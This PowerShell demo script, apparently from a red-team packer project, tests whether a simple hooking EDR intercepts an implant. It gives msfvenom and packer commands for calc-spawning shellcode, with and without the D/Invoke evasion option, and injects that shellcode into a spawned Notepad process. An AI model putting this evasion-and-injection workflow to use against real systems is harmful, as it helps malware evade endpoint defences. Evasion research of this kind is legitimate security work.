function Invoke-Demo{
    <#
    .SYNOPSIS
        Easy script to launch a test to see if the functions used by an implant are intercepted by
        a very simple EDR (Frida xD LOL)
    # Run
        .\demo.bat <implant-filename>
    .EXAMPLE
        # Generate a shellcode file to spawn a calculator on Windows
        msfvenom -p windows/x64/exec CMD=calc.exe EXITFUND=thread -o calc.raw
        # Pack the shellcode with Inceptor and generate a dotnet implant using Process Injection but no special technique
        python inceptor.py dotnet calc.raw --pinject --delay 5 -o demo\note.exe
        # Launch the demo, all the Native functions should be successfully intercepted by frida
        demo.bat note.exe

        # Pack the shellcode with Inceptor and generate a dotnet implant using Process Injection but
        # this time add the dinvoke option
        python inceptor.py dotnet calc.raw --pinject --delay 5 -o demo\note-dinvoke.exe --dinvoke
        # Launch the demo, nothing should be hooked this time
        demo.bat note-dinvoke.exe
     #>
    param (
        [Parameter(Mandatory, ValueFromPipelineByPropertyName)]
        [String]
        [Alias('FullName')]
        $FilePath,
        [Parameter(ValueFromPipelineByPropertyName)]
        [String]
        $PayloadPath,
        [Parameter(ValueFromPipelineByPropertyName)]
        [switch]
        $Dinvoke,
        [Parameter(ValueFromPipelineByPropertyName)]
        [switch]
        $Generate
    )

    $InceptorPath = (Get-Item '..\..\inceptor.py').FullName

    $PayloadPath = If (-not ([String]::IsNullOrEmpty($PayloadPath))) { (Get-Item $PayloadPath).FullName } else { $null }
    $FileFullPath = Resolve-Path -Path $FilePath

    if ($Generate){
        if($Dinvoke){
            $cmd = "python ""$InceptorPath"" dotnet ""$PayloadPath"" -o ""$FileFullPath"" --sgn -P --delay 15"
        }else{
            $cmd = "python ""$InceptorPath"" dotnet ""$PayloadPath"" -o ""$FileFullPath"" -m dinvoke -P --sgn --delay 15"
        }
    }
    if (-not (Test-Path -Path $FilePath)) {
        Write-Error "$FilePath does not exist"
        return
    }


    # Step 0: Start SylantStrike

    Write-Host "[*] Starting SylantStrike hooking"
    $SylantStrikeInject = (Get-Item '.\bin\SylantStrikeInject.exe').FullName
    $SylantStrikeDll = (Get-Item '.\bin\SylantStrike.dll').FullName
    $ProcessName = $(Get-Item $FileFullPath).BaseName
    Write-Host "[*] Executing ""$SylantStrikeInject"" -d ""$SylantStrikeDll"" -p $ProcessName.exe"
    $SSHandle = (Start-Process "$SylantStrikeInject" -Args "-d ""$SylantStrikeDll"" -p $ProcessName.exe" -PassThru)
    Start-Sleep 5

    # Step 1: Spawn sacrificial process
    # This process will be used to perform the shellcode injection

    Write-Host "[*] Starting Notepad"
    $pHandle = (Start-Process "notepad.exe" -PassThru)
    Start-Sleep 1
    $victim_pid = $pHandle.Id

    # Step 2: Start the implant
    # If everyting works fine, the implant should wait 5-15 seconds to execute the code
    # NW: Ensure you've packed the shellcode using the --delay option!!!

    Write-Host "[*] Starting code injection demo loader"
    $demoHandle = (Start-Process "$FileFullPath" -PassThru -Args "--mm --s notepad.exe")
    Start-Sleep 1

    Start-Sleep 40
    Stop-Process -Id $SSHandle.Id -Force -ea SilentlyContinue
    Stop-Process -Id $victim_pid -Force -ea SilentlyContinue
    Stop-Process -Id $demoHandle.Id -Force -ea SilentlyContinue
}

Invoke-Demo -FilePath "$args"